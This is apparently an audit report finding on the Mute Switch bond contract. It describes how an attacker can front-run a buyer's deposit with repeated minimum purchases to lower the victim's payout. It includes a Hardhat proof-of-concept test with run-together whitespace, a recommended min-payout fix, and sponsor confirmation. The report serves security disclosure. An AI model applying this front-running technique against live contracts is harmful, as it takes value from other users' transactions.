@@ -1,0 +1,16 @@
+[H-02] Attacker can front-run Bond buyer and make them buy it for a lower payout than expected
+Submitted by0xA5DF, also found by HollaDieWaldfee (1,2) and chaduke (1,2,3)
+TheMuteBondcontract contains a feature in which after each purchase theepochStartincreases by 5% of the time passed sinceepochStart, this (in most cases) lowers the bond’s price (i.e. buyer gets less payout) for future purchases.
+An attacker can exploit this feature to front-run a deposit/purchase tx and lower the victim’s payout.
+This can also happen by innocent users purchasing before the victim’s tx is included in the blockchain.
+Another (less likely) scenario in which this can happen is when the owner changes the config in a way that lowers the price (e.g. lowering max price, extending epoch duration), if the owner tx executes while a user’sdeposit()tx is in the mempool the user would end up with less payout than intended.
+Side note: the term ‘bond price’ might be confusing since it refers to the payout the buyer gets divided by the value the buyer pays, so a higher price is actually in favor of the buyer.
+Impact
+User ends up buying bond for a lower payout than intended.
+Proof of Concept
+In the PoC below, an attacker manages to make the buyer purchase a bond at a price lower by 32% than intended.
+File:test/bonds.ts
+it('Front run PoC',asyncfunction() {// let price reach the max priceawaittime.increase(60*60*24*7)// price when victim sends out the tx to the mempoolvarexpectedPrice=awaitbondContract.bondPrice()conststartPrice=newBigNumber(100).times(Math.pow(10,18))letminPurchasePayout=newBigNumber(Math.pow(10,16));// using dynamic price didn't work out so I'm using the lowest pricevarminPurchaseValue=minPurchasePayout.times(1e18).div(startPrice).plus(1);// attacker buys the lowest amount 20 timesfor(leti=0;i<20;i++){awaitbondContract.connect(buyer1).deposit(minPurchaseValue.toFixed(),buyer1.address,false)}varinit_dmute=awaitdMuteToken.GetUnderlyingTokens(buyer1.address)letdepositValue=newBigNumber(10).times(Math.pow(10,18)).toFixed();varprice=awaitbondContract.connect(buyer1).deposit(depositValue,buyer1.address,false)varpost_dmute=awaitdMuteToken.GetUnderlyingTokens(buyer1.address)vardmute_diff=newBigNumber(post_dmute.toString()).minus(init_dmute.toString());varactualPrice=dmute_diff.times(1e18).div(depositValue);varreceipt= (awaitprice.wait())// compare the expected price with the actual price// expected price = 200; actual price = 135.8; meaning actual price is ~68% of expected priceconsole.log({expectedPrice,actualPrice:actualPrice.toString()});})
+Recommended Mitigation Steps
+Add a min payout parameter so that users can specify the expected payout. The tx should revert if the actual payout is lower than expected.
+mattt21 (Mute Switch) confirmed
